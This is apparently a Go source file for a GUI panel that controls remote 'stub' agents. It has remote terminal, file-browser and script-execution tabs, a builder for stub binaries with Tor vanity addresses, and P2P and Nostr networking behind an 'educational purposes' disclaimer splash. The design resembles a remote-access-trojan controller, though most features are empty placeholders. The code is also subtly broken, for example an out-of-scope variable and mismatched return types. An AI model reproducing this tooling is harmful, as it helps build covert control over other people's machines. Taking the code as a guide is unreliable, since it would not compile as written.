// Package main implements the Remote Management Panel.
// This is the GUI control interface for managing remote stubs.
// It is optimized for Windows but can be cross-compiled for other platforms with Fyne support.
// The panel displays a mandatory 20-second splash screen on startup with an ethical disclaimer.
// Features include device management, file browser, terminal, metrics monitoring, script execution,
// and a builder tab for cross-compiling binaries with custom options.
package main

import (
    "context"
    "flag"
    "fmt"
    "log"
    "os"
    "os/exec"
    "path/filepath"
    "time"

    "fyne.io/fyne/v2"
    "fyne.io/fyne/v2/app"
    "fyne.io/fyne/v2/canvas"
    "fyne.io/fyne/v2/container"
    "fyne.io/fyne/v2/dialog"
    "fyne.io/fyne/v2/layout"
    "fyne.io/fyne/v2/widget"

    "github.com/remotemgmt/gobased-remote-mgmt/pkg/network"
    "github.com/remotemgmt/gobased-remote-mgmt/pkg/nostr"
)

var (
    version = "0.1.0"
    debug   = flag.Bool("debug", false, "Enable debug logging")
)

func main() {
    flag.Parse()

    if !*debug {
        log.SetFlags(0)
    } else {
        log.SetFlags(log.LstdFlags | log.Lshortfile)
    }

    log.Printf("Remote Management Panel v%s starting...", version)

    myApp := app.New()
    myWindow := myApp.NewWindow()
    myWindow.SetTitle("Remote Management Panel")
    myWindow.Resize(fyne.NewSize(1200, 800))

    // Show splash screen first
    if !showSplashScreen(myApp, myWindow) {
        log.Println("Splash screen cancelled")
        return
    }

    ctx, cancel := context.WithCancel(context.Background())
    defer cancel()

    // Initialize managers
    p2pMgr := network.NewP2PManager(ctx)
    if err := p2pMgr.Initialize("panel-" + time.Now().Format("150405")); err != nil {
        log.Printf("P2P initialization error: %v", err)
    }

    nostrMgr := nostr.NewNostrManager(ctx)
    if err := nostrMgr.Initialize("panel-pubkey", "panel-privkey"); err != nil {
        log.Printf("Nostr initialization error: %v", err)
    }

    // Build main UI
    content := buildMainUI(ctx, p2pMgr, nostrMgr)
    myWindow.SetContent(content)

    myWindow.ShowAndRun()

    log.Println("Panel closed")
}

// showSplashScreen displays the ethical disclaimer splash screen for 20 seconds
func showSplashScreen(myApp fyne.App, myWindow fyne.Window) bool {
    splashWindow := myApp.NewWindow()
    splashWindow.SetTitle("Disclaimer")

    // Create disclaimer text
    disclaimerText := canvas.NewText("THIS IS ONLY FOR EDUCATIONAL AND LEGITIMATE PURPOSES", nil)
    disclaimerText.TextSize = 36
    disclaimerText.TextStyle.Bold = true
    disclaimerText.Alignment = fyne.TextAlignCenter

    // Create timer text
    timerText := widget.NewLabel("Please wait: 20 seconds")
    timerText.Alignment = fyne.TextAlignCenter

    // Create container with layout
    content := container.NewVBox(
        layout.NewSpacer(),
        container.NewCenter(disclaimerText),
        layout.NewSpacer(),
        container.NewCenter(timerText),
        layout.NewSpacer(),
    )

    splashWindow.SetContent(content)
    splashWindow.Resize(fyne.NewSize(800, 400))

    // Make it modal/full window
    splashWindow.SetOnClosed(func() {
        // User tried to close - cancel
    })

    splashWindow.Show()

    // Timer loop - 20 seconds
    remainingTime := 20
    ticker := time.NewTicker(1 * time.Second)
    defer ticker.Stop()

    for i := 0; i < 20; i++ {
        select {
        case <-ticker.C:
            remainingTime--
            if remainingTime > 0 {
                timerText.SetText("Please wait: " + string(rune('0'+remainingTime/10)) + string(rune('0'+remainingTime%10)) + " seconds")
            } else {
                timerText.SetText("Loading main interface...")
            }
        }
    }

    splashWindow.Close()
    return true
}

// buildMainUI builds the main panel UI
func buildMainUI(ctx context.Context, p2pMgr *network.P2PManager, nostrMgr *nostr.NostrManager) *fyne.Container {
    // Create tabs for different features
    tabs := container.NewAppTabs()

    // Dashboard tab
    dashboardTab := container.NewVBox(
        widget.NewLabelWithAlignment("Dashboard", fyne.TextAlignCenter),
        buildDashboard(),
    )
    tabs.Append(container.NewTabItem("Dashboard", dashboardTab))

    // Devices tab
    devicesTab := container.NewVBox(
        widget.NewLabelWithAlignment("Connected Devices", fyne.TextAlignCenter),
        buildDevicesList(),
    )
    tabs.Append(container.NewTabItem("Devices", devicesTab))

    // File Browser tab
    filesTab := container.NewVBox(
        widget.NewLabelWithAlignment("File Browser", fyne.TextAlignCenter),
        buildFileBrowser(),
    )
    tabs.Append(container.NewTabItem("Files", filesTab))

    // Terminal tab
    terminalTab := container.NewVBox(
        widget.NewLabelWithAlignment("Remote Terminal", fyne.TextAlignCenter),
        buildTerminal(),
    )
    tabs.Append(container.NewTabItem("Terminal", terminalTab))

    // Metrics tab
    metricsTab := container.NewVBox(
        widget.NewLabelWithAlignment("System Metrics", fyne.TextAlignCenter),
        buildMetrics(),
    )
    tabs.Append(container.NewTabItem("Metrics", metricsTab))

    // Scripts tab
    scriptsTab := container.NewVBox(
        widget.NewLabelWithAlignment("Script Execution", fyne.TextAlignCenter),
        buildScripts(),
    )
    tabs.Append(container.NewTabItem("Scripts", scriptsTab))

    // Builder tab
    builderTab := container.NewVBox(
        widget.NewLabelWithAlignment("Binary Builder", fyne.TextAlignCenter),
        buildBuilder(myApp),
    )
    tabs.Append(container.NewTabItem("Builder", builderTab))

    // Settings tab
    settingsTab := container.NewVBox(
        widget.NewLabelWithAlignment("Settings", fyne.TextAlignCenter),
        buildSettings(),
    )
    tabs.Append(container.NewTabItem("Settings", settingsTab))

    return container.NewVBox(
        tabs,
    )
}

func buildDashboard() fyne.Widget {
    return container.NewVBox(
        widget.NewLabel("Online Devices: 0"),
        widget.NewLabel("Anomalies: 0"),
        widget.NewLabel("Last Update: Never"),
    )
}

func buildDevicesList() fyne.Widget {
    return container.NewVBox(
        widget.NewLabel("No devices connected"),
    )
}

func buildFileBrowser() fyne.Widget {
    return container.NewVBox(
        widget.NewLabel("Select a device to browse files"),
    )
}

func buildTerminal() fyne.Widget {
    return container.NewVBox(
        widget.NewLabel("Select a device to start terminal session"),
    )
}

func buildMetrics() fyne.Widget {
    return container.NewVBox(
        widget.NewLabel("Select a device to view metrics"),
    )
}

func buildScripts() fyne.Widget {
    scriptInput := widget.NewMultiLineEntry()
    scriptInput.SetPlaceHolder("Enter script content here...")

    executeBtn := widget.NewButton("Execute", func() {
        log.Printf("Executing script: %s", scriptInput.Text)
    })

    return container.NewVBox(
        scriptInput,
        executeBtn,
    )
}

func buildBuilder(myApp fyne.App) fyne.Widget {
    buildStatusLabel := widget.NewLabel("Status: Ready")
    buildOutputText := widget.NewRichTextFromMarkdown("Build output will appear here...")

    // Create form for build options
    panelCheckbox := widget.NewCheck("Build Panel (Windows AMD64)", func(bool) {})
    stubCheckbox := widget.NewCheck("Build Stub Agents", func(bool) {})
    allCheckbox := widget.NewCheck("Build All", func(b bool) {
        panelCheckbox.SetChecked(b)
        stubCheckbox.SetChecked(b)
    })

    outputDirEntry := widget.NewEntry()
    outputDirEntry.SetText("./bin")
    outputDirEntry.PlaceHolder = "Output directory"

    versionEntry := widget.NewEntry()
    versionEntry.SetText("0.1.0")
    versionEntry.PlaceHolder = "Version string"

    vanityEntry := widget.NewEntry()
    vanityEntry.PlaceHolder = "Tor vanity pattern (regex, optional)"

    verboseCheckbox := widget.NewCheck("Verbose output", func(bool) {})

    buildBtn := widget.NewButton("Start Build", func() {
        buildStatusLabel.SetText("Status: Building...")
        buildOutputText.ParseMarkdown("**Building binaries...**\n\n```\nInitializing build process...\n```")

        go performBuild(panelCheckbox.Checked, stubCheckbox.Checked, allCheckbox.Checked,
            outputDirEntry.Text, versionEntry.Text, vanityEntry.Text,
            verboseCheckbox.Checked, buildStatusLabel, buildOutputText, myApp)
    })

    clearBtn := widget.NewButton("Clear Output", func() {
        buildOutputText.ParseMarkdown("Build output will appear here...")
        buildStatusLabel.SetText("Status: Ready")
    })

    formContainer := container.NewVBox(
        widget.NewCard("Build Options", "", container.NewVBox(
            allCheckbox,
            panelCheckbox,
            stubCheckbox,
        )),
        widget.NewCard("Configuration", "", container.NewVBox(
            container.NewBorder(widget.NewLabel("Output Dir:"), nil, nil, nil, outputDirEntry),
            container.NewBorder(widget.NewLabel("Version:"), nil, nil, nil, versionEntry),
            container.NewBorder(widget.NewLabel("Vanity Pattern:"), nil, nil, nil, vanityEntry),
            verboseCheckbox,
        )),
        container.NewHBox(
            buildBtn,
            clearBtn,
            layout.NewSpacer(),
            buildStatusLabel,
        ),
    )

    outputContainer := widget.NewCard("Build Output", "", container.NewScroll(buildOutputText))

    return container.NewVBox(
        formContainer,
        layout.NewSpacer(),
        outputContainer,
    )
}

func performBuild(buildPanel, buildStub, buildAll bool, outputDir, version, vanity string,
    verbose bool, statusLabel *widget.Label, outputText *widget.RichText, myApp fyne.App) {

    if !buildPanel && !buildStub && !buildAll {
        outputText.ParseMarkdown("**Error:** No build targets selected")
        statusLabel.SetText("Status: Error - No targets selected")
        return
    }

    // Create output directory
    if err := os.MkdirAll(outputDir, 0755); err != nil {
        msg := fmt.Sprintf("**Error creating output directory:** %v", err)
        outputText.ParseMarkdown(msg)
        statusLabel.SetText("Status: Error")
        return
    }

    builderPath, err := findBuilderExecutable()
    if err != nil {
        msg := fmt.Sprintf("**Error:** Builder executable not found\n\n```\n%v\n```", err)
        outputText.ParseMarkdown(msg)
        statusLabel.SetText("Status: Error - Builder not found")
        dialog.ShowError(err, myApp.Driver().AllWindows()[0])
        return
    }

    args := []string{
        "-out", outputDir,
    }

    if buildAll {
        args = append(args, "-all")
    } else {
        if buildPanel {
            args = append(args, "-panel")
        }
        if buildStub {
            args = append(args, "-stub")
        }
    }

    if version != "" && version != "0.1.0" {
        args = append(args, "-version", version)
    }

    if vanity != "" {
        args = append(args, "-vanity", vanity)
    }

    if verbose {
        args = append(args, "-v")
    }

    cmd := exec.Command(builderPath, args...)

    output, err := cmd.CombinedOutput()
    if err != nil {
        msg := fmt.Sprintf("**Build completed with error:**\n\n```\n%s\n\nError: %v\n```", string(output), err)
        outputText.ParseMarkdown(msg)
        statusLabel.SetText("Status: Build failed")
        return
    }

    msg := fmt.Sprintf("**Build completed successfully!**\n\n```\n%s\n```\n\n**Binaries saved to:** `%s`", string(output), outputDir)
    outputText.ParseMarkdown(msg)
    statusLabel.SetText("Status: Build successful")

    // Show success dialog
    dialog.ShowInformation("Build Complete", "Binaries have been built successfully!", myApp.Driver().AllWindows()[0])
}

func findBuilderExecutable() (string, error) {
    // Try to find builder in common locations
    locations := []string{
        "./builder",
        "./bin/builder",
        "builder",
        filepath.Join(os.Getenv("HOME"), "go", "bin", "builder"),
    }

    for _, loc := range locations {
        if info, err := os.Stat(loc); err == nil && !info.IsDir() {
            return loc, nil
        }
    }

    // Try to build builder from source if it exists
    if _, err := os.Stat("./cmd/builder"); err == nil {
        return "go", nil
    }

    return "", fmt.Errorf("builder executable not found in expected locations")
}

func buildSettings() fyne.Widget {
    return container.NewVBox(
        widget.NewLabel("Nostr Relays:"),
        widget.NewEntry(),
        widget.NewLabel("P2P Bootstraps:"),
        widget.NewEntry(),
        widget.NewButton("Save Settings", func() {
            log.Println("Settings saved")
        }),
    )
}
